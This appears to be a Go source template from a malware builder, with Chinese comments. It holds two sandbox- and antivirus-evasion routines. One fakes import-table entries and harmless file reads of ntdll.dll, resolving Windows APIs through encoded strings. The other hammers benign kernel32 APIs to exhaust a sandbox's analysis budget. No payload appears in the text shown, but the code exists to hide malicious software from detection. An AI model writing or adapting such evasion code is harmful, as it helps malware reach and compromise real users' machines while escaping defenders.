// behaviorCamouflage 模拟正常程序行为，同时通过实际调用标准库
// 在 PE 导入表中产生合法条目（IAT 伪装）。
func behaviorCamouflage() {
	// IAT 伪装：这些调用确保编译后的 PE 导入表包含合法条目
	go func() {
		_, _ = net.LookupHost("localhost")
		c := &http.Client{Timeout: 1 * time.Millisecond}
		resp, err := c.Get("http://127.0.0.1:1")
		if err == nil && resp != nil {
			resp.Body.Close()
		}
		u, err := user.Current()
		if err == nil {
			_ = u.Username
		}
		_ = strings.Contains("normal application", "app")
		runtime.GC()
	}()

	// 文件操作伪装
	k32 := kernel32()
	createFileA := getProcAddr(k32, ds("{{index .EncodedStrings "CreateFileA"}}"))
	readFile := getProcAddr(k32, ds("{{index .EncodedStrings "ReadFile"}}"))
	closeH := getProcAddr(k32, ds("{{index .EncodedStrings "CloseHandle"}}"))
	if createFileA == 0 || readFile == 0 || closeH == 0 {
		time.Sleep(time.Duration(500+rand.Intn(1000)) * time.Millisecond)
		return
	}
	// 读取系统文件模拟正常行为
	sysFiles := []string{
		ds("{{index .EncodedStrings "C:\\\\Windows\\\\System32\\\\ntdll.dll"}}"),
	}
	for _, f := range sysFiles {
		fp, _ := syscall.BytePtrFromString(f)
		h, _, _ := syscall.Syscall9(createFileA, 7,
			uintptr(unsafe.Pointer(fp)), 0x80000000, 1, 0, 3, 0x80, 0, 0, 0)
		if h != 0 && h != ^uintptr(0) {
			var br uint32
			buf := make([]byte, 1024)
			syscall.Syscall6(readFile, 5, h, uintptr(unsafe.Pointer(&buf[0])),
				uintptr(len(buf)), uintptr(unsafe.Pointer(&br)), 0, 0)
			syscall.Syscall(closeH, 1, h, 0, 0)
			time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
		}
	}
	time.Sleep(time.Duration(500+rand.Intn(1000)) * time.Millisecond)
}

// apiHammering 大量调用无害 API，消耗沙箱分析预算。
func apiHammering() {
	k32 := kernel32()
	gtc := getProcAddr(k32, ds("{{index .EncodedStrings "GetTickCount"}}"))
	gpid := getProcAddr(k32, ds("{{index .EncodedStrings "GetCurrentProcessId"}}"))
	gst := getProcAddr(k32, ds("{{index .EncodedStrings "GetSystemTimeAsFileTime"}}"))
	qpc := getProcAddr(k32, ds("{{index .EncodedStrings "QueryPerformanceCounter"}}"))
	gtid := getProcAddr(k32, ds("{{index .EncodedStrings "GetCurrentThreadId"}}"))

	apis := make([]uintptr, 0, 5)
	for _, a := range []uintptr{gtc, gpid, gst, qpc, gtid} {
		if a != 0 {
			apis = append(apis, a)
		}
	}
	if len(apis) == 0 {
		return
	}

	iterations := 1000 + rand.Intn(1000)
	var counter int64
	var ft [8]byte
	for i := 0; i < iterations; i++ {
		api := apis[i%len(apis)]
		switch api {
		case gst:
			syscall.Syscall(api, 1, uintptr(unsafe.Pointer(&ft[0])), 0, 0)
		case qpc:
			syscall.Syscall(api, 1, uintptr(unsafe.Pointer(&counter)), 0, 0)
		default:
			syscall.Syscall(api, 0, 0, 0, 0)
		}
		if i%100 == 0 {
			time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
		}
	}
}
